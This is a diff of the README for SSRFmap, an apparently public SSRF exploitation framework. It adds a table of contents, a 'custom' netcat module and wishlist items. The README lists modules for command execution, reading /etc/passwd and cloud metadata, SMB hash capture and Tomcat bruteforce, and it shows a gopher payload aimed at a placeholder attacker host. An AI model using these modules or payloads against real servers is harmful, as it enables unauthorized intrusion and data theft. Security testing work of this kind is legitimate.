@@ -5,6 +5,16 @@ SSRF are often used to leverage actions on other services, this framework aims t
 
 > Server Side Request Forgery or SSRF is a vulnerability in which an attacker forces a server to perform requests on their behalf.
 
+## Summary
+
+* [Modules](#modules)
+* [Install and Manual](#install-and-manual)
+* [Examples](#examples)
+* [SSRFmap - Tests](#ssrfmap-tests)
+* [Contribute](#contribute)
+  * [Contributors](#thanks-to-the-contributors)
+
+
 ## Modules
 
 The following modules are already implemented and can be used with the `-m` argument.
@@ -18,7 +28,7 @@ The following modules are already implemented and can be used with the `-m` argu
 | `mysql`        | MySQL Command execution |
 | `docker`       | Docker Infoleaks via API |
 | `smtp`         | SMTP send mail |
-| `portscan`     | Scan ports for the host |
+| `portscan`     | Scan top 8000 ports for the host |
 | `networkscan`  | HTTP Ping sweep over the network |
 | `readfiles`    | Read files such as `/etc/passwd` |
 | `alibaba`      | Read files from the provider (e.g: meta-data, user-data) |
@@ -28,6 +38,7 @@ The following modules are already implemented and can be used with the `-m` argu
 | `socksproxy`   | SOCKS4 Proxy |
 | `smbhash`      | Force an SMB authentication via a UNC Path |
 | `tomcat`       | Bruteforce attack against Tomcat Manager |
+| `custom`       | Send custom data to a listening service, e.g: netcat |
 
 
 ## Install and Manual
@@ -57,7 +68,7 @@ optional arguments:
   --level [LEVEL]     Level of test to perform (1-5, default: 1)
 ```
 
-## SSRFmap - Basic use
+## Examples
 
 First you need a request with a parameter to fuzz, Burp requests works well with SSRFmap. 
 They should look like the following. More examples are available in the **/data** folder.
@@ -121,6 +132,7 @@ python ssrfmap.py -r data/request.txt -p url -m readfiles
 
 I :heart: pull requests :)
 Feel free to add any feature listed below or a new service.
+  - Redis PHP Exploitation 
   - HTTP module (Jenkins ?)
   ```powershell
   gopher://<proxyserver>:8080/_GET http://<attacker:80>/x HTTP/1.1%0A%0A
@@ -173,7 +185,7 @@ You can also contribute with a beer IRL or with `buymeacoffee.com`
 
 [![Coffee](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://buymeacoff.ee/swissky)
 
-## Thanks to the contributors
+### Thanks to the contributors
 
 - [ttffdd](https://github.com/ttffdd)
 
